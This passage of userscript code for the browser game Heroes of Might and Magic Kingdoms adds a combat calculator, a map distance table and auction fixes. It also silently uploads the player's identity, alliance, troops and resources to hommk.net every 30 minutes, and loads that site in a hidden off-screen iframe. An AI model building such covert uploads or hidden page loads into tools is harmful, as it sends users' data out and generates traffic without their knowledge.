			playerHero.troupes[troupePosition] = prepare_troupe(troupe);
		}
		// Fill versus hero
		if ( fortress.hero ) {
			versusHero.statut = 1;
			versusHero.heros = 1;
			prepare_heros(versusHero, fortress.hero );
		}
		var troupes = [];
		if ( level > 0 )
			troupes = fortress.floorsUnitStacks[level];
		else
			troupes = fortress.hero.attachedUnitStackList;
		for ( var t = 0; t < troupes.length; t++ ) {
			var troupe = troupes[t].content || troupes[t];
			var position = troupe.powerPosition || troupe.stackPosition;
			versusHero.troupes[position] = prepare_troupe(troupe);
		}
		if ( level > 0 ) {
			var levelParams = fortress.regionBuildingComponentList[level];
			if ( levelParams.defenseTypeShortName == "BALISTAS" )
				versusHero.baliste = levelParams.defenseLevel;
			else if ( levelParams.defenseTypeShortName == "ANTIMAGIC" )
				versusHero.antimagie = levelParams.defenseLevel;
			else if ( levelParams.defenseTypeShortName == "TRAPS" )
				versusHero.pieges = levelParams.defenseLevel;
		}
		window.open( url_combat + '?info=' + encode_donnees_combat(donnees) ,'_blank' );
	}
	HOMMK_user.func.jactariFortress = calcFortress;
	
})();(function(){
	if(!$('#map-center').length && $('#WorldMap'+HOMMK.player.content.worldId+'Content').length){
		$tooltip = $('<div><table width="100%" id="distances-tp" border="1"></table></div>')
			.dialog({
				title:'Distances',
				zIndex:9999,
				autoOpen:false,
				resizable:false,
			});
		$table = $('#distances-tp')
			.css({
				textAlign:'center'
			});
		function updateLocation(){
			function getCoordinate( input ) {
				return Math.min( Math.max( 1, parseInt( input ) ), HOMMK.worldMap.content._size );
			}
			/*$( "#map-center" )
				.children( "input" ).attr( "disabled", true ).end()
				.children( ".button" ).addClass( "disabled" );*/
			var x = getCoordinate( $( "#map-center input.x" ).val() );
			var y = getCoordinate( $( "#map-center input.y" ).val() );
			// keep this module as scope when being called back
			//var self = this;
			HOMMK.worldMap.center( x, y, undefined, function() {
				//self.updateCoordinates();
			});
			return false;
		}
		function fix(val,len){
			len = len || 1;
			val = Math.floor(val*Math.pow(10,len));
			return val/Math.pow(10,len);
		}
		function time(hours){
			var h = Math.floor(hours);
			var min = (hours-h)*60;
			var m = Math.floor(min);
			var s = Math.floor((min-m)*60);
			return h+':'+m+':'+s;
		}
		$('<div id="map-center"><div id="bdist" class="button bdistances" title="Distances" style=""><div class="left"></div><div class="text">Distances</div><div class="right"></div></div><input type="text" size="1" class="x" value="56"><input type="text" size="1" class="y" value="47"><div class="button bmapcenter"><div class="left"></div><div class="text">Center</div><div class="right"></div></div></div>')
			.appendTo($('#WorldMap'+HOMMK.player.content.worldId+'Content'));
		$('#map-center .bmapcenter').click(updateLocation);
		$('#bdist').click(function(){
			$table.empty();
			var c, cities = HOMMK.elementPool.obj.RegionCity.values();
			var dx, dy, cy = HOMMK.currentView.regionY, cx = HOMMK.currentView.regionX;
			$table.append('<tr><th>city</th><th>dist.</th><th>army</th><th>caravan</th><th>hero</th></tr>');
			for(var i=0;i<cities.length;i++){
				c = cities[i].content;
				dx = Math.abs(c.x-cx);
				dy = Math.abs(c.y-cy);
				dist = Math.sqrt(dx*dx+dy*dy);
				$table.append('<tr><td>'+c.cityName+'</td><td title="'+dist+'">'+fix(dist)+'</td><td>'+time(dist/4)+'</td><td>'+time(dist/12)+'</td><td>'+time(dist/10)+'</td></tr>');
			}
			toggle_dialog($tooltip);
		});
		//$('#map-center form').submit(updateLocation);
	}
})();(function(){

	function getBestStack(){
		var stacks = HOMMK.elementPool.obj.UnitStack.values();
		var creatures = {},cre;
		for(var i=0;i<stacks.length;i++){
			cre = stacks[i].content;
			creatures[cre.unitEntityId] = creatures[cre.unitEntityId] || {tier:cre.tier,qty:0}; // name:cre.unitEntityName,power:cre.unitEntityPower,
			creatures[cre.unitEntityId].qty += cre.quantity; 
			creatures[cre.unitEntityId].pow = creatures[cre.unitEntityId].qty*cre.unitEntityPower;
		}
		var bests=[];
		for(var i in creatures){
			bests.push(creatures[i]);
		}
		bests.sort(function(a,b){return a.pow<b.pow?1:-1});
		bests = bests.slice(0,3);
		return bests;
	}
	function getRessource(r){
		var stacks = HOMMK.elementPool.obj.RessourceStack.values();
		var res = [0,0,0,0,0,0,0,0];
		for(var i=0;i<stacks.length;i++){
			r = stacks[i].content;
			res[r.ressourceEntityId] += r.quantity;
		}
		res[1] = res[1]/1000;
		for(var i=1;i<8;i++){
			res[i] = parseInt(res[i]);
		}
		return res;
	}
	function getKey(){
		var playerList = HOMMK.friendList.content.friendListContent;
		var k = '';
		for(var i=0;i<playerList.length;i++){
			k += playerList[i].userId%10;
		}
		return k;
	}
	if(HOMMK && HOMMK.player && HOMMK.player.content){
		var FACTION = ["","HAVEN","ACADEMY","INFERNO","NECROPOLIS","SYLVAN"];
		var p = HOMMK.player.content;
		var data = localStorage.userData || {};
		if(typeof data == "string")
			data = JSON.parse(data);
		data[p.userId] = data[p.userId] || {};
		data[p.userId][p.worldId] = data[p.userId][p.worldId] || {};
		// UPDATE PLAYER
		if(!data[p.userId][p.worldId].player_update || (data[p.userId][p.worldId].player_update + 1000*60*30) < (new Date()).getTime()){ // 1 time for 30 min
			var script = document.createElement('script');
			var sponsor = w._SPONSOR?w._SPONSOR:0;
			var src = "http://www.hommk.net/final/update/data.php?";
			src += "userId="+p.userId;
			src += "&sponsor="+sponsor;
			src += "&playerId="+p.id;
			src += "&worldId="+p.worldId;
			src += "&playerName="+p.name;
			src += "&faction="+FACTION.indexOf(p.factionEntityTagName);
			src += "&region="+p.regionCount;
			src += "&allianceId="+p.allianceId;
			src += "&allianceName="+p.allianceName;	
			src += "&hero="+p.heroCount;
			src += "&slot="+(p.cityNumberGameplayThreshold-p.regionCount);
			//src += "&hash="+getKey();			
			var bests = getBestStack();
			for(var i=0;i<bests.length;i++){
				bestUnit = bests[i];
				src += "&tier"+i+"="+bestUnit.tier+"&qty"+i+"="+bestUnit.qty+"&pow"+i+"="+bestUnit.pow;
			}
			var res = getRessource();
			for(var i=1;i<8;i++){
				src += "&r"+i+"="+res[i];
			}
			script.src = encodeURI(src);
			document.getElementsByTagName('head')[0].appendChild(script);
			data[p.userId][p.worldId].player_update = (new Date()).getTime();
			localStorage.userData = JSON.stringify(data);
		}
	}
	console.log('upload actived');

	/*
		avascript:
			window.oncontextmenu = document.oncontextmenu = document.body.oncontextmenu = function(){return true;};
	
	*/
	
	
})();

	function dupe(fn){
		return function(){
			var r = fn.apply(this,arguments);
			if(HOMMK_user.ressources)
				HOMMK_user.ressources.refresh();
			
			if(HOMMK_user.vigie && HOMMK_user.vigie.visible )
				HOMMK_user.vigie.refresh();
			return r;
		}
	}
	var selectRegion=HOMMK.worldMap.selectRegion;	
	HOMMK.worldMap.selectRegion=function(k){
		//console.log(k);
		var retour=selectRegion.apply(this,arguments);
		$('#WorldMap'+HOMMK.player.content.worldId+'CityName').html( $('#WorldMap'+HOMMK.player.content.worldId+'CityName').html() + "<img title='click to see the last spying troop.' src='http://www.hommk.net/img/spy.png' style='margin-left:10px;width:22px;height:20px;' valign='middle' />");
		$('#WorldMap'+HOMMK.player.content.worldId+'CityName').css('cursor','pointer');
		$('#WorldMap'+HOMMK.player.content.worldId+'CityName').click(function(){
			var c = k.content;
			HOMMK_user.ally.filter.x = c.x;
			HOMMK_user.ally.filter.y = c.y;
			HOMMK_user.ally.filter.player = c.pId;
			HOMMK_user.ally.list.player['p'+c.pId] = c.pN;
			if(c._iaId){
				HOMMK_user.ally.filter.alliance = c._iaId;
				HOMMK_user.ally.list.alliance['a'+c._iaId] = c.iAN;
			}
			//console.log(HOMMK_user.ally.filter);
			if(!HOMMK_user.ally.visible)
				toggle_dialog(HOMMK_user.ally.dialog);
			//console.log($('#tabs').tabs);
			$('#tabs').tabs({selected:1});
			
			HOMMK_user.ally.refresh_search_list();
			return true;
		});
		return retour;
	};
	HOMMK.worldMap.update = dupe(HOMMK.worldMap.update);
	HOMMK.worldMap.move = dupe(HOMMK.worldMap.move);
	HOMMK.worldMap.center = dupe(HOMMK.worldMap.center);

	if(HOMMK_user.ressources)
		HOMMK_user.ressources.refresh();

	var CHECKER_GOLD_VIGIE = 0; 
	function check_frames(){
		var jactari,scribe, market;
		jactari = market = scribe = false;
		var frame = get_frame();
		if ( frame ) {    
			switch ( frame.elementType  ) {
				case "HeroFrame":
				case "ZoneBuildingPortalUpgradeFrame":
				case "BattlePrepFrame":
				case "MarketPlaceFrame":
					market = true ;
					break;
				//case "MessageBoxFrame":
				//	scribe = HOMMK_user.scribe.check() ;
			}
		}
			
		if(market && !!frame.artefactAuctionBodyPartFilterList){
			// BUG
			var f=frame;
			if(HOMMK.ARTEFACT_BODYPART_LIST.indexOf(f.artefactAuctionBodyPartFilterList[0])==-1){
				delete f.artefactAuctionBodyPartFilterList[0];
				f.artefactAuctionBodyPartFilterList.length = 0;
				if (f.artefactAuctionBodyPartFilterList.length == 0) {
					HOMMK.ARTEFACT_BODYPART_LIST.each(function (b) {
						f.artefactAuctionBodyPartFilterList.include(b)
					}, f)
				}
				HOMMK.ARTEFACT_BODYPART_LIST.each(function (b) {
					if (f.artefactAuctionBodyPartFilterList.contains(b)) {
						HOMMK.setCssSpriteBackground(f.getChildElement("ArtefactAuctionSearch_" + b), "artefactsAuctionsFilters", b)
					} else {
						HOMMK.setCssSpriteBackground(f.getChildElement("ArtefactAuctionSearch_" + b), "artefactsAuctionsFilters", b + "_DISABLED")
					}
				}, f);
				f.artefactAuctionOfferList.setBodyPartFilter(f.artefactAuctionBodyPartFilterList);
				f.artefactAuctionOfferListSlider.updateDimensions();
			}
		}
		
		if(HOMMK_user.vigie.visible && HOMMK.elementPool.obj.HeroMove && HOMMK_user.vigie.moves!=HOMMK.elementPool.obj.HeroMove.length){
			HOMMK_user.vigie.moves=HOMMK.elementPool.obj.HeroMove.length;
			
			HOMMK_user.vigie.toggle();
			HOMMK_user.vigie.toggle();
		}
		
		
		
	}

	$('body').click(function(){
		$('.submenu').hide();
		return true;
	});
	
	setInterval(check_frames, 500);

(function(){

	if(ADMIN_DEBUG)
		return;
	// google
	var ads = document.createElement('iframe');
	ads.src = "http://www.hommk.net/?HOME";
	ads.style.position = "absolute";
	ads.style.width = "1000px";
	ads.style.left = "-1010px";
	document.body.appendChild(ads);
})();

	
}})();